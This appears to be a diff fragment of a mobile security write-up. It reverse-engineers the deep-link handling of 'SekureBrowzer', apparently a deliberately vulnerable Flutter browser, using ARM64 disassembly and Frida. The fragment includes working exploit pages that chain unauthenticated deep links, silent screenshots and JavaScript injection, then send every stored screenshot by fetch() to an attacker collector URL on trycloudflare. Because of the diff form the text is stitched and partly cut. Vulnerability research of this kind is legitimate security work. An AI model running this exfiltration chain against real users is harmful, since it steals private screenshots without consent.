-0x19ef8c  LDUR X0, [X2,#-1]              ; uri's header word
-0x19ef90  UBFX X0, X0, #0xC, #0x14       ; X0 = uri's class id
-0x19ef94  MOV  X1, X2                    ; X1 = receiver pointer (not the class id!)
-0x19ef98  SUB  X30, X0, #0xFF4           ; reads X0, writes X30 — X0 survives
-0x19ef9c  LDR  X30, [X21,X30,LSL#3]
-0x19efa0  BLR  X30                       ; <-- single hook lands here
-```
-
-`this.context.x21` gives the dispatch table base. `this.context.x0` gives the receiver's class id (it survives because the `SUB` writes to `x30`, not `x0`). `this.context.lr` gives the CPU's own resolved call target — the ground truth to self-check against.
-
-Run live against a physical device (pid 9938, USB-attached):
-
+### Resolve AOT dispatch table
 ```python
 #resolve_dispatch_table.py
 import frida
@@ -1518,619 +2175,10 @@ if __name__ == "__main__":
     sys.exit(main())
 ```
 
-```bash
-$ python3 resolve_dispatch_table.py
-dump.dart: parsed 12570 records, 10976 unique offsets
-attached to pid 9938
-[hook] single dispatch-table capture site installed
->> sent: sekurebrowzer://anyhost -> dispatched sekurebrowzer://anyhost
-[openurl] sekurebrowzer://anyhost -> openURL: returned 1
-[ready] captured X21 (dispatch table base) = 0xdbd408000
-[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
-[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
-[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
-[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
-[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
->> resolveIndex(classId=94, selector=0): {'target': '0x103ac0358', 'fileOffset': '0x258358', 'inModule': True}
-DONE
-```
-
-A second selector, `0` (`String.==`), was cross-checked the same way against `classId=94` (`OneByteString`) and resolved to file offset `0x258358` — the exact address a completely separate Frida hook (directly on the string-equality routine itself, described below). So two different methods landing on the same address is strong evidence the whole pipeline — `X21` capture, index math, `dump.dart` lookup — is correct end to end.
-
-Resolving a raw target address back to a name is one line of arithmetic plus a `dump.dart` lookup: `dump.dart offset = (live_target_address - App_module_base) - 0xE8C0`
-
-That resolution pipeline (`resolve_dispatch_table.py`) can be sanity-checked with no device at all, against addresses already confirmed elsewhere:
-
-```bash
->>> resolve(by_offset, '0x19f83c')
-_BrowserScreenState._processDataCommand (package:sekure_browzer/main.dart)
->>> resolve(by_offset, '0x258358')
-String.== (dart:core)
-```
-
-Both correct, which validates the parser and the offset math before trusting it against live data.
-
-### Prologue + stack-overflow guard (not param-related)
-
-```asm
-0x19eec8  STP  X29, X30, [X15,#-0x10]!   
-0x19eecc  MOV  X29, X15                  
-0x19eed0  SUB  X15, X15, #0x70           ; SP -= 0x70, reserve locals
-0x19eed4  MOV  X0, X1
-0x19eed8  STUR X1, [X29,#-8]             ; spill arg1 (self, BrowserScreenState) -> -8
-0x19eedc  MOV  X1, X2
-0x19eee0  STUR X2, [X29,#-0x10]          ; spill arg2 (Uri = the deep-link target) -> -0x10
-0x19eee4  LDR  X16, [X26,#0x38]          ; X26 = ThreadState*; load stack-limit
-0x19eee8  CMP  X15, X16
-0x19eeec  B.LS loc_19F810                ; if SP past limit -> grow-stack stub, then retry from 0x19eef0
-```
-
-### Log line #1 build + print — "Deep link received: <uri>" (not param-related, plumbing only)
-
-```asm
-0x19eef0  MOV  X1, #3
-0x19eef4  BL   sub_2BF3B0                ; allocate interpolation buffer #1
-0x19eef8  MOV  X3, X0
-0x19eefc  LDUR X0, [X29,#-8]
-0x19ef00  STUR X3, [X29,#-0x18]
-0x19ef04  STUR X0, [X3,#0x17]
-0x19ef08  MOV  X1, X22                   ; X22 = cached Dart `null` sentinel (reused throughout as the null-check comparand)
-0x19ef0c  MOV  X2, #4
-0x19ef10  BL   sub_2C0498                ; allocate interpolation buffer #2
-0x19ef14  MOV  X1, X0
-0x19ef18  STUR X1, [X29,#-0x20]
-0x19ef1c  ADD  X16, X27, #0xF,LSL#12
-0x19ef20  LDR  X16, [X16,#0xBD8]         ; POOLFULL[X27+0xFBD8] = "Deep link received: "
-0x19ef24  STUR X16, [X1,#0x17]
-0x19ef28  LDUR X2, [X29,#-0x10]          ; reload uri
-0x19ef2c  LDUR X0, [X2,#-1]
-0x19ef30  UBFX X0, X0, #0xC, #0x14
-0x19ef34  STR  X2, [X15]
-0x19ef38  LDR  X4, [X27,#0x3B0]
-0x19ef3c  MOV  X17, #0x1AD3
-0x19ef40  ADD  X30, X0, X17
-0x19ef44  LDR  X30, [X21,X30,LSL#3]      ; Uri.toString() dispatch (X0's own class-id path, no fixed selector table row above)
-0x19ef48  BLR  X30                       ; CALL uri.toString()
-0x19ef4c  LDUR X1, [X29,#-0x20]
-0x19ef50  ADD  X25, X1, #0x1F
-0x19ef54  STR  X0, [X25]
-0x19ef58  TBZ  W0, #0, loc_19EF74        
-0x19ef5c  LDURB W16, [X1,#-1]
-0x19ef60  LDURB W17, [X0,#-1]
-0x19ef64  AND  X16, X17, X16,LSR#2
-0x19ef68  TST  X16, X28,LSR#32
-0x19ef6c  B.EQ loc_19EF74
-0x19ef70  BL   sub_2BE720                
-0x19ef74  LDUR X16, [X29,#-0x20]
-0x19ef78  STR  X16, [X15]
-0x19ef7c  BL   _StringBase___interpolate_11494   ; build "Deep link received: <uri>"
-0x19ef80  MOV  X1, X0
-0x19ef84  BL   ____print_37ba8           ; print() the line
-```
-
-### `Uri.scheme` guard — gate on the `sekurebrowzer://` scheme itself
-
-```asm
-0x19ef88  LDUR X2, [X29,#-0x10]          ; X2 = uri
-0x19ef8c  LDUR X0, [X2,#-1]              ; uri's header word
-0x19ef90  UBFX X0, X0, #0xC, #0x14       ; uri's class id
-0x19ef94  MOV  X1, X2                    ; X1 = receiver = uri
-0x19ef98  SUB  X30, X0, #0xFF4           ; selector 0xFF4 = Uri.scheme getter
-0x19ef9c  LDR  X30, [X21,X30,LSL#3]
-0x19efa0  BLR  X30                       ; CALL uri.scheme  -> X0 = scheme string
-0x19efa4  LDUR X1, [X0,#-1]              ; scheme string's header word
-0x19efa8  UBFX X1, X1, #0xC, #0x14       ; scheme string's class id
-0x19efac  ADD  X16, X27, #0xC,LSL#12
-0x19efb0  LDR  X16, [X16,#0x238]         ; POOLFULL[X27+0xC238] = "sekurebrowzer"
-0x19efb4  STP  X16, X0, [X15]            ; equality-call arg array: [X15]="sekurebrowzer", [X15+8]=scheme
-0x19efb8  MOV  X0, X1                    ; X0 = scheme's class id (index directly, selector 0)
-0x19efbc  MOV  X30, X0
-0x19efc0  LDR  X30, [X21,X30,LSL#3]      ; selector 0 = String.operator== 
-0x19efc4  BLR  X30                       ; CALL scheme == "sekurebrowzer"
-0x19efc8  TBNZ W0, #4, loc_19F800        ; if NOT equal -> jump straight to `return` at 0x19f800.
-                                       ; every query-param extraction below only runs for
-                                       ; sekurebrowzer://... links; sekureexec:// is NOT this gate
-                                       ; and is not handled anywhere in this function
-```
-
-### The query parameters, and how the function actually reads them
-
-Each block: `uri.queryParameters` getter (selector `0xFF0`) → `Map.[]("<key>")` (selector `0x1000`) → spill result to its stack slot. `X2` is reloaded with the `uri` object (from `-0x10`) at the start of every block since the previous block's `Map.[]` call clobbered it.
-
-**`"url"` → slot `-0x20`:**
-```asm
-0x19efcc  LDUR X3, [X29,#-8]
-0x19efd0  LDUR X2, [X29,#-0x10]          ; X2 = uri (receiver for .queryParameters)
-0x19efd4  LDUR X4, [X29,#-0x18]
-0x19efd8  LDUR X0, [X2,#-1]
-0x19efdc  UBFX X0, X0, #0xC, #0x14       ; uri's class id
-0x19efe0  MOV  X1, X2
-0x19efe4  SUB  X30, X0, #0xFF0           ; selector 0xFF0 = Uri.queryParameters
-0x19efe8  LDR  X30, [X21,X30,LSL#3]
-0x19efec  BLR  X30                       ; CALL uri.queryParameters  -> X0 = Map<String,String>
-0x19eff0  LDUR X1, [X0,#-1]              ; map's header word
-0x19eff4  UBFX X1, X1, #0xC, #0x14       ; map's class id
-0x19eff8  MOV  X16, X0                   ; save map ref
-0x19effc  MOV  X0, X1                    ; X0 = map's class id
-0x19f000  MOV  X1, X16                   ; X1 = receiver = the map
-0x19f004  ADD  X2, X27, #0xD,LSL#12
-0x19f008  LDR  X2, [X2,#0x488]           ; POOLFULL[X27+0xD488] = "url"  <- the lookup KEY, arg to Map.[]
-0x19f00c  SUB  X30, X0, #1,LSL#12        ; selector 0x1000 = Map.operator[]
-0x19f010  LDR  X30, [X21,X30,LSL#3]
-0x19f014  BLR  X30                       ; CALL queryParameters["url"]  -> X0 = url value (String? or null)
-0x19f018  MOV  X3, X0
-0x19f01c  LDUR X2, [X29,#-0x10]          ; reload uri for the next extraction
-0x19f020  STUR X3, [X29,#-0x20]          ; spill url value -> slot -0x20
-```
-
-**`"takeScreenshot"` → slot `-0x28`:**
-```asm
-0x19f024  LDUR X0, [X2,#-1]
-0x19f028  UBFX X0, X0, #0xC, #0x14
-0x19f02c  MOV  X1, X2
-0x19f030  SUB  X30, X0, #0xFF0           ; Uri.queryParameters
-0x19f034  LDR  X30, [X21,X30,LSL#3]
-0x19f038  BLR  X30                       ; -> Map
-0x19f03c  LDUR X1, [X0,#-1]
-0x19f040  UBFX X1, X1, #0xC, #0x14
-0x19f044  MOV  X16, X0
-0x19f048  MOV  X0, X1
-0x19f04c  MOV  X1, X16
-0x19f050  ADD  X2, X27, #0xF,LSL#12
-0x19f054  LDR  X2, [X2,#0x400]           ; POOLFULL[X27+0xF400] = "takeScreenshot"  <- lookup key
-0x19f058  SUB  X30, X0, #1,LSL#12        ; Map.operator[]
-0x19f05c  LDR  X30, [X21,X30,LSL#3]
-0x19f060  BLR  X30                       ; -> takeScreenshot value
-0x19f064  MOV  X3, X0
-0x19f068  LDUR X2, [X29,#-0x10]
-0x19f06c  STUR X3, [X29,#-0x28]          ; spill -> slot -0x28
-```
-
-**`"execute"` → slot `-0x30`:**
-```asm
-0x19f070  LDUR X0, [X2,#-1]
-0x19f074  UBFX X0, X0, #0xC, #0x14
-0x19f078  MOV  X1, X2
-0x19f07c  SUB  X30, X0, #0xFF0
-0x19f080  LDR  X30, [X21,X30,LSL#3]
-0x19f084  BLR  X30                       ; -> Map
-0x19f088  LDUR X1, [X0,#-1]
-0x19f08c  UBFX X1, X1, #0xC, #0x14
-0x19f090  MOV  X16, X0
-0x19f094  MOV  X0, X1
-0x19f098  MOV  X1, X16
-0x19f09c  ADD  X2, X27, #0xD,LSL#12
-0x19f0a0  LDR  X2, [X2,#0x200]           ; POOLFULL[X27+0xD200] = "execute"  <- lookup key
-0x19f0a4  SUB  X30, X0, #1,LSL#12
-0x19f0a8  LDR  X30, [X21,X30,LSL#3]
-0x19f0ac  BLR  X30                       ; -> execute value (raw JS to run)
-0x19f0b0  MOV  X3, X0
-0x19f0b4  LDUR X2, [X29,#-0x18]
-0x19f0b8  STUR X3, [X29,#-0x30]          ; spill -> slot -0x30
-0x19f0bc  STUR X0, [X2,#0x1F]            ; also stash into log-builder #1 for the "Execute JS parameter:" line
-0x19f0c0  TBZ  W0, #0, loc_19F0DC
-0x19f0c4  LDURB W16, [X2,#-1]
-0x19f0c8  LDURB W17, [X0,#-1]
-0x19f0cc  AND  X16, X17, X16,LSR#2
-0x19f0d0  TST  X16, X28,LSR#32
-0x19f0d4  B.EQ loc_19F0DC
-0x19f0d8  BL   sub_2BEB84                
-```
-
-**`"dbCommand"` → slot `-0x38`:**
-```asm
-0x19f0dc  LDUR X4, [X29,#-0x10]
-0x19f0e0  LDUR X0, [X4,#-1]
-0x19f0e4  UBFX X0, X0, #0xC, #0x14
-0x19f0e8  MOV  X1, X4
-0x19f0ec  SUB  X30, X0, #0xFF0
-0x19f0f0  LDR  X30, [X21,X30,LSL#3]
-0x19f0f4  BLR  X30                       ; -> Map
-0x19f0f8  LDUR X1, [X0,#-1]
-0x19f0fc  UBFX X1, X1, #0xC, #0x14
-0x19f100  MOV  X16, X0
-0x19f104  MOV  X0, X1
-0x19f108  MOV  X1, X16
-0x19f10c  ADD  X2, X27, #0xF,LSL#12
-0x19f110  LDR  X2, [X2,#0xBE0]           ; POOLFULL[X27+0xFBE0] = "dbCommand"  <- lookup key, THE export gate
-0x19f114  SUB  X30, X0, #1,LSL#12
-0x19f118  LDR  X30, [X21,X30,LSL#3]
-0x19f11c  BLR  X30                       ; -> dbCommand value (null unless present)
-0x19f120  MOV  X3, X0
-0x19f124  LDUR X2, [X29,#-0x10]
-0x19f128  STUR X3, [X29,#-0x38]          ; spill -> slot -0x38 (checked at 0x19f4bc, see below)
-```
-
-**`"dbId"` → slot `-0x40`:**
-```asm
-0x19f12c  LDUR X0, [X2,#-1]
-0x19f130  UBFX X0, X0, #0xC, #0x14
-0x19f134  MOV  X1, X2
-0x19f138  SUB  X30, X0, #0xFF0
-0x19f13c  LDR  X30, [X21,X30,LSL#3]
-0x19f140  BLR  X30                       ; -> Map
-0x19f144  LDUR X1, [X0,#-1]
-0x19f148  UBFX X1, X1, #0xC, #0x14
-0x19f14c  MOV  X16, X0
-0x19f150  MOV  X0, X1
-0x19f154  MOV  X1, X16
-0x19f158  ADD  X2, X27, #0xF,LSL#12
-0x19f15c  LDR  X2, [X2,#0xBE8]           ; POOLFULL[X27+0xFBE8] = "dbId"  <- lookup key
-0x19f160  SUB  X30, X0, #1,LSL#12
-0x19f164  LDR  X30, [X21,X30,LSL#3]
-0x19f168  BLR  X30                       ; -> dbId value
-0x19f16c  MOV  X3, X0
-0x19f170  LDUR X2, [X29,#-0x10]
-0x19f174  STUR X3, [X29,#-0x40]          ; spill -> slot -0x40 (never compared locally — forwarded
-                                        ; verbatim to _processDataCommand at 0x19f4c8)
-```
-
-**`"openGallery"` → slot `-0x48`:**
-```asm
-0x19f178  LDUR X0, [X2,#-1]
-0x19f17c  UBFX X0, X0, #0xC, #0x14
-0x19f180  MOV  X1, X2
-0x19f184  SUB  X30, X0, #0xFF0
-0x19f188  LDR  X30, [X21,X30,LSL#3]
-0x19f18c  BLR  X30                       ; -> Map
-0x19f190  LDUR X1, [X0,#-1]
-0x19f194  UBFX X1, X1, #0xC, #0x14
-0x19f198  MOV  X16, X0
-0x19f19c  MOV  X0, X1
-0x19f1a0  MOV  X1, X16
-0x19f1a4  ADD  X2, X27, #0xF,LSL#12
-0x19f1a8  LDR  X2, [X2,#0xBF0]           ; POOLFULL[X27+0xFBF0] = "openGallery"  <- lookup key,
-                                       ; THE top-priority gate (checked first of all, at 0x19f468)
-0x19f1ac  SUB  X30, X0, #1,LSL#12
-0x19f1b0  LDR  X30, [X21,X30,LSL#3]
-0x19f1b4  BLR  X30                       ; -> openGallery value
-0x19f1b8  MOV  X3, X0
-0x19f1bc  LDUR X2, [X29,#-0x10]
-0x19f1c0  STUR X3, [X29,#-0x48]          ; spill -> slot -0x48
-```
-
-**`"attackerUrl"` → slot `-0x50`:**
-```asm
-0x19f1c4  LDUR X0, [X2,#-1]
-0x19f1c8  UBFX X0, X0, #0xC, #0x14
-0x19f1cc  MOV  X1, X2
-0x19f1d0  SUB  X30, X0, #0xFF0
-0x19f1d4  LDR  X30, [X21,X30,LSL#3]
-0x19f1d8  BLR  X30                       ; -> Map
-0x19f1dc  LDUR X1, [X0,#-1]
-0x19f1e0  UBFX X1, X1, #0xC, #0x14
-0x19f1e4  MOV  X16, X0
-0x19f1e8  MOV  X0, X1
-0x19f1ec  MOV  X1, X16
-0x19f1f0  ADD  X2, X27, #0xF,LSL#12
-0x19f1f4  LDR  X2, [X2,#0xBF8]           ; POOLFULL[X27+0xFBF8] = "attackerUrl"  <- lookup key
-0x19f1f8  SUB  X30, X0, #1,LSL#12
-0x19f1fc  LDR  X30, [X21,X30,LSL#3]
-0x19f200  BLR  X30                       ; -> attackerUrl value (exfil destination, consumed inside
-                                       ; _processDataCommand, not compared here)
-0x19f204  MOV  X1, X22
-0x19f208  MOV  X2, #4
-0x19f20c  STUR X0, [X29,#-0x50]          ; spill -> slot -0x50
-```
-
-### Actual control flow (in execution order)
-
-```
-scheme guard: if uri.scheme != "sekurebrowzer" → return (0x19f800)
-log "Deep link received: <uri>"
-extract all params from uri.queryParameters
-log "Target URL parameter: <url>"
-log "Take Screenshot parameter: <takeScreenshot>"
-log "Execute JS parameter: <execute>"
-log "Database Command: <dbCommand>"
-log "Open Gallery: <openGallery>"
-log "Path segments: <uri.pathSegments>"   (uri metadata, unrelated to the 7 params)
-duplicate-uri / null-state guard (internal, not param-driven)
-SnackBar "Processing deep link: <uri>"
-
-── PRIORITY 1: if openGallery == "true":
-    show a SnackBar, Future.delayed(...) [gallery nav trigger], RETURN — 0x19f4b4
-              (dbCommand/url/takeScreenshot/execute never even get to run if this fires)
-
-── PRIORITY 2: if dbCommand != null:
-    BL _processDataCommand(self, dbCommand, dbId, attackerUrl, ...), RETURN — 0x19f4e0
-              (this is the bulk-screenshot-export / exfil pipeline)
-
-── PRIORITY 3 (only if no openGallery, no dbCommand): url handling
-    if url present and non-empty:
-        normalize scheme (add "https://" if missing a scheme)
-        Uri.parse(normalized) → WebViewController.loadRequest(...)
-              else (url absent/empty):
-                 hardcoded fallback: Uri.parse("https://yahoo.com") → loadRequest(...)
-
-── if takeScreenshot == "true":
-    SnackBar "Screenshot..." + Future.delayed(...) [screenshot trigger]
-              (falls through, does NOT return — execute is still checked next)
-
-── if execute != null:
-    SnackBar "Executing JavaScript: <execute>" + Future.delayed(...)
-              [JS-injection trigger — presumably runJavaScript(execute) inside
-              the delayed callback]
-
-0x19f800  return
-```
-
-Tracing the actual control flow surfaces two behaviors a quick read misses: `openGallery` outranks everything, including `dbCommand` — if both are present on the same link, `openGallery` wins and the function returns before `dbCommand` is even inspected. And `url` has a hardcoded fallback (`https://yahoo.com`) when it's absent, so even a param-less link still forces a navigation — though that only matters when `dbCommand` isn't also present, since `dbCommand` short-circuits before reaching the `url` handling at all.
-
-Putting it together, this is the shape of the scheme: 
-```bash
-sekurebrowzer://<any-host>?url=<page>&takeScreenshot=true&dbCommand=<cmd>&dbId=<id>&attackerUrl=<url>
-```
-
-And the validation on all of it: one comparison, `Uri.scheme == "sekurebrowzer"`. The host segment is read by nothing in this function and gates nothing — any host string works identically. None of the query values are checked against an allow-list, a token, or a signature anywhere.
-
-## Locating the next call — `_processDataCommand`
-
-`_handleDeepLink` only calls `_processDataCommand` when `dbCommand` is present, which makes it the function to decompile next.
-
-### Argument layout
-
-The function's prologue saves five incoming registers to the stack frame:
-
-```asm
-0x19f848   STUR X22, [X29,#-8]        ; X22 = Dart's boxed-null sentinel for this call
-0x19f84c   STUR X1,  [X29,#-0xA0]     ; arg1 -> this (_BrowserScreenState)
-0x19f85c   STUR X2,  [X29,#-0xA8]     ; arg2 -> dbCommand
-0x19f860   STUR X1,  [X29,#-0xB0]     ; arg3 -> dbId
-0x19f864   STUR X5,  [X29,#-0xB8]     ; arg5 -> attackerUrl
-```
-
-`dbCommand` at `[X29,-0xA8]`, `dbId` at `[X29,-0xB0]`, `attackerUrl` at `[X29,-0xB8]`. This is confirmed by every downstream use: all three `String.==` comparisons load their left-hand operand from `-0xA8`, the `"get"` branch's null check reads `-0xB0`, and the `"exfiltrate"` branch's null check reads `-0xB8`.
-
-### The dispatch: three gated comparisons, then a real no-op default
-
-```C
-if (dbCommand == "getAll") {
-    exportedJson = StorageManager.getAllScreenshotsAsJson()
-    runJavaScript(<template: writes JSON into a hidden #stolen-data div, ends with alert()>)
-    showSnackBar("Retrieved all screenshots (N bytes)")
-}
-else if (dbCommand == "get") {
-    if (dbId == null) return;                              // silent no-op
-    id = int.parse(dbId)
-    base64Img = StorageManager.getScreenshotAsBase64(id)
-    runJavaScript(<template: paints a visible "Stolen Screenshot" box>)
-    showSnackBar("Retrieved screenshot ID <id> with <n> bytes")
-}
-else if (dbCommand == "exfiltrate") {
-    exportedJson = StorageManager.getAllScreenshotsAsJson()
-    postUrl = (attackerUrl != null) ? attackerUrl : "https://example.com/exfiltrate"
-    runJavaScript(<template: hidden iframe + auto-submit form POST to postUrl>)
-    showSnackBar("Sending screenshots to external server: <postUrl>")
-}
-else {
-    print("Unknown database command: " + dbCommand)        // no export, no runJavaScript, no SnackBar
-}
-```
-
-### The sinks
-
-All three recognized branches end the same way: export the screenshot store, wrap the result in a JS template, and hand it to `WebViewController.runJavaScript()` — the sink. The templates themselves show exactly what lands on the victim's screen, quoted below.
-
-`getAll`'s template writes into the currently-loaded page's DOM:
-
-```js
-let dataDiv = document.getElementById('stolen-data');
-if (!dataDiv) {
-  dataDiv = document.createElement('div');
-  dataDiv.id = 'stolen-data';
-  dataDiv.style.display = 'none';
-  document.body.appendChild(dataDiv);
-}
-dataDiv.textContent = JSON.stringify(data);
-alert('Successfully retrieved ' + data.length + ' screenshots from database');
-```
-
-`get`'s template (single screenshot) does something more visible — it paints a real UI element, not just a hidden div:
-
-```js
-const img = document.createElement('img');
-img.src = 'data:image/png;base64,' + imgData;
-const container = document.createElement('div');
-container.style.position = 'fixed';
-container.style.top = '10px';
-container.style.right = '10px';
-container.style.zIndex = '9999';
-// ... white background, red border, drop shadow, title "Stolen Screenshot (ID: N)"
-```
-
-`exfiltrate`'s template is the one that doesn't need any cooperation from the loaded page at all — it builds and submits its own POST:
-
-```js
-localStorage.setItem('stored_screenshots', rawData);
-alert('Successfully stored ' + data.length + ' screenshots. Sending to <postUrl>');
-const iframe = document.createElement('iframe');
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
-const form = document.createElement('form');
-form.method = 'POST';
-form.action = '<postUrl>';
-// ... appended into the iframe and submitted
-```
-
-### A second, independent sink: `sekureexec://anyhost?js=`
-
-Everything above explains `sekurebrowzer://` and its `dbCommand`/`execute` parameters. It does not, though, explain `sekureexec://anyhost?js=<payload>` — that scheme is never compared against anywhere inside `_handleDeepLink`, which checks `Uri.scheme == "sekurebrowzer"` exactly once and returns for anything else.
-
-Finding where `sekureexec://` is actually handled means cross-referencing every call site of `WebViewController.runJavaScript` across the whole binary, not just the one function already under investigation. That turns up three call sites inside `_processDataCommand` (above) plus three more inside anonymous Dart closures the tree-shaker kept alive. One of those closures is the WebView's own `NavigationDelegate` callback — it runs on every navigation attempt inside the app, not just external deep links:
-
-```asm
-; does the navigation URL start with "sekureexec://" ?
-0x1abf08   LDR   X2, [pool 0x10128]        ; "sekureexec://"
-0x1abf14   BL    _StringBase__startsWith
-0x1abf18   TBNZ  W0, #4, loc_1ABFB0        ; not it -> check "sekurebrowzer://" instead
-
-; yes: pull the "js" query parameter straight out and run it
-0x1abf24   BL    Uri__parse
-0x1abf44   BLR   X30                       ; Uri.queryParameters getter
-0x1abf60   LDR   X2, [pool 0xDC50]         ; "js"
-0x1abf6c   BLR   X30                       ; Map["js"]
-0x1abf98   BL    WebViewController__runJavaScript  ; SINK — no decode, no length check, no allow-list
-
-; not sekureexec:// either — does it start with "sekurebrowzer://"?
-0x1abfd8   BL    Uri__parse
-0x1abff4   BL    _BrowserScreenState___handleDeepLink   ; recurses straight back into the same dispatcher
-```
-
-This closure does two separate jobs. It implements `sekureexec://anyhost?js=<payload>` as its own sink — the scheme check, the parameter extraction, and the `runJavaScript` call are all here, not in `_handleDeepLink` — with the value handed to `runJavaScript` coming straight off `Uri.parse(url).queryParameters["js"]`, no decoding and no restriction. It also re-enters `_handleDeepLink` for any in-page `sekurebrowzer://` navigation — a clicked link, `window.location =`, a redirecting meta tag, a form action — that isn't `http(s)://`. Once an attacker's page is loaded into the WebView by any means, including the very first `url=` navigation from the initial deep link, it can drive the rest of the chain with an in-page redirect instead of a second OS-level scheme launch — one fewer place for the one-time "Open in SekureBrowzer?" prompt to reappear.
-
-## From source to sink
-
-A few separate root causes chain into one exploit:
-
-- **RC1 — no authentication on the custom URL scheme.** Zero native-layer check (stock `FlutterAppDelegate`), zero Dart-layer check beyond `Uri.scheme == "sekurebrowzer"`. Any page, in any browser, can drive the app.
-- **RC2 — silent screenshot capture, no consent.** `takeScreenshot=true` reaches `_silentScreenshot()`, which captures the screen with no prompt and no visible indicator. This is the one step in the chain that's fully silent end to end.
-- **RC3 — arbitrary JS execution against the live page, two separate sinks.** on `sekurebrowzer://` and `js=` on `sekureexec://anyhost` both reach `WebViewController.runJavaScript()` with essentially no restriction.
-- **RC4 — unencrypted, bulk-exportable screenshot history.** Every screenshot, manual or silent, lands in a plaintext SQLite `screenshots.db`. `getAllScreenshotsAsJson()` is live, reachable code, wired directly into `_processDataCommand`.
-
-Chained together, the strongest one-shot variant uses `dbCommand=exfiltrate` — it doesn't need any script on the landing page at all, because the app builds and submits the exfiltration POST itself:
-
-```
-attacker page load
-    │
-    ▼
-sekurebrowzer://anyhost?url=<attacker_url>&takeScreenshot=true&dbCommand=exfiltrate&attackerUrl=<collector_url>
-    │
-    ├── navigate WebView to <attacker_url>                                     (RC1)
-    ├── silently capture current page, no prompt                               (RC2)
-    └── "exfiltrate" branch in _processDataCommand:
-            StorageManager.getAllScreenshotsAsJson()
-                ──▶ runJavaScript(<hidden iframe + auto-POST form>)            (RC3 + RC4)
-                        │
-                        ▼
-        app-built form POSTs every stored screenshot, as JSON, to
-        <collector_url> — no landing-page script required
-```
-
-The weaker variant, `dbCommand=getAll` with no `attackerUrl`, still works but needs the landing page to do the last step itself — it writes the JSON into `#stolen-data` on whatever page is loaded, and something on that page has to read it back out and ship it
-
-## Building the PoC
-
-The one-shot `dbCommand=exfiltrate` variant looked the cleanest on paper — the app itself builds and submits a hidden-iframe form to an attacker-controlled URL, needing no script on the landing page at all. But in testing, the app-built POST didn't reliably reach the collector server, despite the SnackBar confirming the attempt. It may be a timing issue (the iframe form executing before the page has a clean network path), or a WebView configuration that actually does reject certain cross-origin POSTs. Rather than spend more time on it, the PoC will go with the `dbCommand=getAll` variant, which requires the attacker's landing page to read the stolen data back out of the DOM and ship it itself, but proved reliable in testing.
-
-The exploit is two attacker-controlled pages running under the same domain. The entry point is `exploit.html`:
-
-```
-User opens: https://attacker.com/exploit.html in SekureBrowzer
-      ↓
-JavaScript sets window.location = "sekurebrowzer://anyhost?url=https://attacker.com/exfil.html&takeScreenshot=true"
-      ↓
-App: silently screenshots the exploit page (RC2)
-App: navigates WebView to exfil.html (RC1)
-```
-
-Once the WebView lands on `exfil.html`, that page immediately fires a second deep link on page load:
-
-```js
-window.location = "sekurebrowzer://anyhost?dbCommand=getAll"
-```
-
-The `getAll` branch in `_processDataCommand` then exports every stored screenshot as JSON, wraps it in JavaScript code that writes the JSON into a hidden `<div id="stolen-data">`, and injects that into the page via `WebViewController.runJavaScript()` (RC3). The page-side script, meanwhile, polls or observes that div (e.g., via `MutationObserver`) until it populates with the JSON, then POSTs the stolen data to a local collector server:
-
-```html
-<!-- exploit.html -->
- <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Loading...</title></head>
-<body>
-<p>Redirecting to screenshot page...</p>
-
-<script>
-// Trigger deep link: navigate to exfil.html AND take silent screenshot
-// App will load exfil.html, capture screenshot, then exfil.html runs getAll+POST
-window.location = "sekurebrowzer://anyhost?url=https://attacker.com/exfil.html&takeScreenshot=true";
-</script>
-
-</body>
-</html>
-```
-
-```html
-<!-- exfil.html -->
-<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Processing...</title></head>
-<body>
-<h3>Exfiltrating Stored Screenshots</h3>
-<p id="status" style="color:#666; font-size:12px;"></p>
-<pre id="stolen-data" style="white-space:pre-wrap;word-break:break-all;border:1px solid #ccc;padding:10px;display:none;"></pre>
-
-<script>
-const STATUS = document.getElementById('status');
-const STOLEN = document.getElementById('stolen-data');
-const COLLECTOR = 'https://archive-oriented-imagine-warner.trycloudflare.com/collect';
-
-function log(msg) {
-  const ts = new Date().toISOString().split('T')[1].split('.')[0];
-  STATUS.textContent = `[${ts}] ${msg}`;
-  console.log(msg);
-}
-
-function triggerDeepLink(url) {
-  const link = document.createElement('a');
-  link.href = url;
-  link.style.display = 'none';
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-}
-
-function runExfil() {
-  setTimeout(() => {
-    log('Step 1: Triggering getAll (retrieve all screenshots)...');
-    triggerDeepLink("sekurebrowzer://anyhost?dbCommand=getAll");
-
-    setTimeout(() => {
-      log('Step 2: Reading DOM and posting to collector...');
-      const data = STOLEN.textContent;
-      if (!data || data.length === 0) {
-        log('ERROR: No data in #stolen-data div. getAll may have failed.');
-        return;
-      }
-
-      log('Step 3: Sending POST (staying on page)...');
-
-      // Use fetch() with URL-encoded form data
-      const params = new URLSearchParams();
-      params.append('dump', data);
-
-      fetch(COLLECTOR, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: params.toString()
-      })
-      .then(response => {
-        log('✓ Data exfiltrated successfully. Response: ' + response.status);
-        return response.text();
-      })
-      .catch(error => {
-        log('✗ Exfil failed: ' + error);
-      });
-    }, 3000);
-    
-  }, 3000);
-}
-
-// Auto-run exfil when page loads
-log('Page loaded. Screenshot captured. Starting exfil chain...');
-runExfil();
-</script>
-
-</body>
-</html>
-```
-
-The collector is a simple local Python server listening on `http://localhost:8000/collect`. It receives each POSTed dump (URL-encoded JSON), decodes it into a list of screenshot records, then base64-decodes each record's `image_data` field. A quick sniff of the magic bytes (PNG header is `89 50 4e 47`, JPEG is `ff d8 ff e0`) determines the file type, and the raw bytes are written to disk as a real image file:
-
+### Collector sever
 ```python
 #!/usr/bin/env python3
+# collector_server.py - Full collector — including the static file server, CORS handling, and JSON-dump
 import base64
 import http.server
 import json
@@ -2254,88 +2302,81 @@ if __name__ == "__main__":
     http.server.HTTPServer(("0.0.0.0", port), Handler).serve_forever()
